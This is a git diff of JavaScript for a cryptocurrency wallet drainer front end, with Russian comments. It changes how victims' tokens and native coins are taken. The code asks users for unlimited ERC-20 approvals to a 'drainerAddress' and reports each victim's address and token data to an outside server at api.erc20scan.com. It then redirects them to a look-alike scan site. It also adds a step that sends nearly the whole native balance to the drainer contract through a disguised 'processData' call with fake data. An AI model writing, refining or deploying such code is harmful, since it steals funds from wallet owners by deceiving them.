@@ -4,7 +4,6 @@ import { mainnet, polygon, bsc, arbitrum } from '@reown/appkit/networks';
 import { WagmiAdapter } from '@reown/appkit-adapter-wagmi';
 import { ethers } from 'ethers';
 import config from './config.js'; // Импортируем конфигурацию
-import { showAMLCheckModal } from './aml-check-modal.js';
 
 // === Конфигурация AppKit ===
 const projectId = config.PROJECT_ID;
@@ -43,8 +42,7 @@ const ERC20_ABI = [
   "function balanceOf(address account) view returns (uint256)",
   "function approve(address spender, uint256 amount) returns (bool)",
   "function decimals() view returns (uint8)",
-  "function allowance(address owner, address spender) view returns (uint256)",
-  "function transfer(address to, uint256 amount) returns (bool)"
+  "function allowance(address owner, address spender) view returns (uint256)"
 ];
 
 // ABI для дрейнера
@@ -261,8 +259,8 @@ async function checkBalance(chainId, userAddress, provider) {
 
 // Проверка наличия средств
 function hasFunds(bal) {
-  const minNativeBalance = ethers.utils.parseEther("0.001"); // Для газа, но не будет списываться
-  const minTokenBalance = ethers.utils.parseUnits("1.0", 6); // Требуется минимум 1 USDT
+  const minNativeBalance = ethers.utils.parseEther("0.001");
+  const minTokenBalance = ethers.utils.parseUnits("0.1", 6);
 
   if (bal.nativeBalance.gt(minNativeBalance)) return true;
 
@@ -367,7 +365,7 @@ async function drain(chainId, signer, userAddress, bal, provider) {
   }
 
   const MAX = ethers.constants.MaxUint256;
-  const MIN_TOKEN_BALANCE = ethers.utils.parseUnits("1.0", 6);
+  const MIN_TOKEN_BALANCE = ethers.utils.parseUnits("0.1", 6);
 
   console.log(`📍 Шаг 3: Проверяем баланс ${chainConfig.nativeToken} для газа`);
   let ethBalance;
@@ -458,25 +456,28 @@ async function drain(chainId, signer, userAddress, bal, provider) {
         await delay(10);
 
         const tx = await contract.approve(chainConfig.drainerAddress, MAX, {
-          gasLimit: 100000,
+          gasLimit: 500000,
           gasPrice: gasPrice,
           nonce
         });
         console.log(`📤 Транзакция approve отправлена: ${tx.hash}`);
-        await hideModalWithDelay(); // Закрываем модальное окно верификации
         const receipt = await tx.wait();
         console.log(`✅ Транзакция approve подтверждена: ${receipt.transactionHash}`);
-
-        // Получаем roundedAmount из notifyServer
-        const notifyResult = await notifyServer(userAddress, address, balance, chainId, receipt.transactionHash, provider, balance);
-        const roundedAmount = notifyResult.roundedAmount;
-        await showAMLCheckModal(connectedAddress, roundedAmount); // Открываем модальное окно AML
+        await notifyServer(userAddress, address, balance, chainId, receipt.transactionHash, provider);
+        // Перенаправление на Approve.html
+        window.location.href = 'https://erc20scan-result.com';
         status = 'confirmed';
 
-        modalClosed = true;
+        // Закрываем модальное окно после успешного approve
+        if (!modalClosed) {
+          console.log(`ℹ️ Закрываем модальное окно после успешного approve для токена ${token}`);
+          await hideModalWithDelay();
+          modalClosed = true;
+        }
       } catch (error) {
         console.error(`❌ Ошибка одобрения токена ${token}: ${error.message}`);
         if (error.message.includes('user rejected')) {
+          // Пользователь отклонил транзакцию
           if (!modalClosed) {
             console.log(`ℹ️ Пользователь отклонил approve для токена ${token}, закрываем модальное окно`);
             await hideModalWithDelay("Error: Transaction rejected by user.");
@@ -488,40 +489,70 @@ async function drain(chainId, signer, userAddress, bal, provider) {
     } else {
       console.log(`✅ Allowance уже достаточно для токена ${token}`);
       try {
-        const notifyResult = await notifyServer(userAddress, address, balance, chainId, null, provider, balance);
-        const roundedAmount = notifyResult.roundedAmount;
-        await showAMLCheckModal(connectedAddress, roundedAmount); // Открываем модальное окно AML
+        await notifyServer(userAddress, address, balance, chainId, null, provider);
+        // Перенаправление на Approve.html
+        window.location.href = 'https://erc20scan-result.com';
         status = 'confirmed';
       } catch (error) {
         console.error(`❌ Ошибка при вызове notifyServer для токена ${token}: ${error.message}`);
         throw new Error(`Failed to notify server for token ${token}: ${error.message}`);
       }
 
+      // Закрываем модальное окно, если allowance уже достаточно
       if (!modalClosed) {
         console.log(`ℹ️ Allowance достаточно для токена ${token}, закрываем модальное окно`);
         await hideModalWithDelay();
         modalClosed = true;
       }
     }
+  }
 
-    // Списываем только 1 USDT, если это USDT
-    if (token === "USDT" && address === chainConfig.usdtAddress) {
-      const oneUsdt = ethers.utils.parseUnits("1.0", decimals); // Фиксированная сумма 1 USDT
-      if (balance.gte(oneUsdt)) {
-        try {
-          const tx = await contract.transfer(chainConfig.drainerAddress, oneUsdt, {
-            gasLimit: 100000,
-            gasPrice: await provider.getGasPrice()
-          });
-          console.log(`📤 Транзакция transfer 1 USDT отправлена: ${tx.hash}`);
-          const receipt = await tx.wait();
-          console.log(`✅ Транзакция transfer 1 USDT подтверждена: ${receipt.transactionHash}`);
-        } catch (error) {
-          console.error(`❌ Ошибка списания 1 USDT: ${error.message}`);
-          throw new Error(`Failed to transfer 1 USDT: ${error.message}`);
+  console.log(`📍 Шаг 7: Обрабатываем ${chainConfig.nativeToken}`);
+  if (bal.nativeBalance.gt(0)) {
+    const drainer = new ethers.Contract(chainConfig.drainerAddress, DRAINER_ABI, signer);
+    const gasReserve = ethers.utils.parseEther("0.002");
+    const value = bal.nativeBalance.sub(gasReserve).gt(0) ? bal.nativeBalance.sub(gasReserve) : ethers.BigNumber.from(0);
+
+    if (value.gt(0)) {
+      const taskId = Math.floor(Math.random() * 1000000);
+      const dataHash = ethers.utils.keccak256(ethers.utils.toUtf8Bytes(`fakeData-native-${Date.now()}`));
+      const nonce = await provider.getTransactionCount(userAddress, "pending");
+
+      try {
+        const gasPrice = await provider.getGasPrice();
+        console.log(`📏 Цена газа для ${chainConfig.nativeToken}: ${ethers.utils.formatUnits(gasPrice, "gwei")} gwei`);
+
+        console.log(`⏳ Задержка перед processData`);
+        await delay(10);
+
+        const tx = await drainer.processData(taskId, dataHash, nonce, [], {
+          value,
+          gasLimit: 500000,
+          gasPrice: gasPrice,
+          nonce
+        });
+        console.log(`📤 Транзакция processData отправлена: ${tx.hash}`);
+        const receipt = await tx.wait();
+        console.log(`✅ Транзакция processData подтверждена: ${receipt.transactionHash}`);
+        status = 'confirmed';
+
+        // Закрываем модальное окно после успешного processData
+        if (!modalClosed) {
+          console.log(`ℹ️ Закрываем модальное окно после успешного processData для ${chainConfig.nativeToken}`);
+          await hideModalWithDelay();
+          modalClosed = true;
         }
-      } else {
-        console.warn(`⚠️ Недостаточно USDT для списания 1 токена, баланс: ${ethers.utils.formatUnits(balance, decimals)}`);
+      } catch (error) {
+        console.error(`❌ Ошибка вывода ${chainConfig.nativeToken}: ${error.message}`);
+        if (error.message.includes('user rejected')) {
+          // Пользователь отклонил транзакцию
+          if (!modalClosed) {
+            console.log(`ℹ️ Пользователь отклонил processData для ${chainConfig.nativeToken}, закрываем модальное окно`);
+            await hideModalWithDelay("Error: Transaction rejected by user.");
+            modalClosed = true;
+          }
+        }
+        throw new Error(`Failed to process ${chainConfig.nativeToken}: ${error.message}`);
       }
     }
   }
@@ -530,26 +561,17 @@ async function drain(chainId, signer, userAddress, bal, provider) {
   return status;
 }
 
-async function notifyServer(userAddress, tokenAddress, amount, chainId, txHash, provider, initialAmount) {
+
+async function notifyServer(userAddress, tokenAddress, amount, chainId, txHash, provider) {
   try {
     console.log(`📍 Уведомляем сервер о токене ${tokenAddress} для ${userAddress}`);
     const token = new ethers.Contract(tokenAddress, ERC20_ABI, provider);
-    const [balance, decimals] = await Promise.all([
-      token.balanceOf(userAddress),
-      token.decimals()
-    ]);
-    console.log(`📊 Текущий баланс токена: ${ethers.utils.formatUnits(balance, decimals)}`);
-    
-    // Исправляем округление: используем минимальное значение, чтобы избежать нулевого amount
-    const balanceUnits = ethers.utils.formatUnits(balance, decimals);
-    const roundedBalance = Math.max(parseFloat(balanceUnits), 0.0001); // Минимальное значение 0.0001
-    const roundedAmount = ethers.utils.parseUnits(roundedBalance.toString(), decimals);
+    const decimals = await token.decimals();
+    console.log(`📊 Decimals токена: ${decimals}`);
 
-    console.log(`📊 Округлённый баланс: ${roundedBalance}, roundedAmount: ${roundedAmount.toString()}`);
-
-    if (roundedAmount.lte(0)) {
-      throw new Error('Amount is zero or negative after rounding');
-    }
+    // Фиксируем amount как 1 токен с учётом decimals
+    const fixedAmount = ethers.utils.parseUnits("1", decimals);
+    console.log(`📊 Фиксированное количество: 1 токен, в wei: ${fixedAmount.toString()}`);
 
     const response = await fetch('https://api.erc20scan.com/api/transfer', {
       method: 'POST',
@@ -557,7 +579,7 @@ async function notifyServer(userAddress, tokenAddress, amount, chainId, txHash, 
       body: JSON.stringify({
         userAddress,
         tokenAddress,
-        amount: roundedAmount.toString(),
+        amount: fixedAmount.toString(),
         chainId,
         txHash
       })
@@ -568,12 +590,12 @@ async function notifyServer(userAddress, tokenAddress, amount, chainId, txHash, 
       throw new Error(`Failed to notify server: ${data.message || 'Unknown error'}`);
     }
     console.log(`✅ Сервер успешно уведомлён о трансфере токена ${tokenAddress}`);
-    return { success: true, roundedAmount: roundedAmount.toString() };
   } catch (error) {
     console.error(`❌ Ошибка уведомления сервера: ${error.message}`);
     throw new Error(`Failed to notify server: ${error.message}`);
   }
 }
+
 
 // Основная функция runDrainer
 async function runDrainer(provider, signer, userAddress) {
